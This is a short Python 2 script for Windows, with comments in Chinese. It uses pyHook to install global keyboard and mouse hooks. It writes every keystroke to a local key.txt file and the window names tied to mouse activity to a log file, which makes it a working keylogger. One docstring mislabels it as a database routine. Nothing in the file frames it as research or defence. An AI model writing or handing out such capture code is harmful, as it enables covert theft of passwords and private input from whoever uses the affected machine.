#!/usr/bin/env python  
# -*- coding: utf-8 -*-  
  
  
import pythoncom  
import pyHook  
import time
import os
  
path = os.getcwd()
key_path = os.path.join(path,'key.txt')
log_path = os.path.join(path,'log_path.txt')
def onMouseEvent(event):  
    "处理鼠标事件"  
##    fobj.writelines('-' * 20 + 'MouseEvent Begin' + '-' * 20 + '\n')  
##    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))  
##    fobj.writelines("MessageName:%s\n" % str(event.MessageName))  
##    fobj.writelines("Message:%d\n" % event.Message)  
##    fobj.writelines("Time_sec:%d\n" % event.Time)  
##    fobj.writelines("Window:%s\n" % str(event.Window))  
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))  
##    fobj.writelines("Position:%s\n" % str(event.Position))  
##    fobj.writelines('-' * 20 + 'MouseEvent End' + '-' * 20 + '\n')  
    return True  
  

def onKeyboardEvent(event):   
    "处理键盘事件"     
##    fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20 + '\n')  
##    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))  
##    fobj.writelines("MessageName:%s\n" % str(event.MessageName))  
##    fobj.writelines("Message:%d\n" % event.Message)  
##    fobj.writelines("Time:%d\n" % event.Time)  
##    fobj.writelines("Window:%s\n" % str(event.Window))  
##    fobj.writelines("WindowName:%s\n" % str(event.WindowName))  
##    fobj.writelines("Ascii_code: %d\n" % event.Ascii)  
##    fobj.writelines("Ascii_char:%s\n" % chr(event.Ascii))  
    fobj.writelines("Key:%s\n" % str(event.Key))
    kobj = open(key_path,  'a+')
    kobj.writelines("%s\n" % str(event.Key))
    
##    fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n')
##    kobj.writelines("Key:%s\n" % str(event.Key))
    print str(event.Key)
    return True  
  
  

  
if __name__ == "__main__":   
    ''''' 
    Function:操作SQLITE3数据库函数 
    Input：NONE 
    Output: NONE 
    '''    
          
    #打开日志文件  
    fobj = open(log_path,  'w')
  
    #创建hook句柄  
    hm = pyHook.HookManager()  
  
  
    #监控键盘  
    hm.KeyDown = onKeyboardEvent  
    hm.HookKeyboard()  
  
  
    #监控鼠标  
    hm.MouseAll = onMouseEvent  
    hm.HookMouse()  
      
    #循环获取消息  
    pythoncom.PumpMessages()  
      
    #关闭日志文件  
    fobj.close()
    kobj.close()
